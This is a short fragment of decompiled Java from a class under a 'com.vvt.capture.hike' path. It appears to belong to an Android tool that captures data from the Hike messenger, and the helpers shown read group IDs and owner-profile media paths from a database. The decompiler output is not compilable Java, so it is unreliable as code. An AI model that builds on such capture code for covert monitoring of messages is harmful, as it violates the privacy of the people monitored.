    int i = paramCursor.getColumnIndex("groupId");
    String str = paramCursor.getString(i);
    boolean bool2 = com.vvt.ag.b.a(str);
    if (bool2)
    {
      bool2 = false;
      str = null;
    }
    for (;;)
    {
      boolean bool3 = b;
      if (bool3) {}
      return bool2;
      bool2 = true;
    }
  }
  
  private static com.vvt.im.events.info.d d(SQLiteDatabase paramSQLiteDatabase, String paramString)
  {
    boolean bool1 = b;
    if (bool1) {}
    com.vvt.im.events.info.d locald = new com/vvt/im/events/info/d;
    locald.<init>();
    String str1 = c.d();
    String str2 = c.e();
    Object localObject = ImMediaFileType.OWNER_PROFILE;
    localObject = a(str1, paramString, (ImMediaFileType)localObject);
    locald.b(str1);
    locald.a(str2);
    locald.f((String)localObject);
    boolean bool2 = b;
    if (bool2) {}
    return locald;
  }
  
  private static String d(String paramString)
  {
    boolean bool1 = b;
    if (bool1) {}
    bool1 = false;
    String str1 = "_";
    int i = paramString.indexOf(str1);
    String str2 = paramString.substring(0, i);
    boolean bool2 = b;
    if (bool2) {}
    return str2;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/hike/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */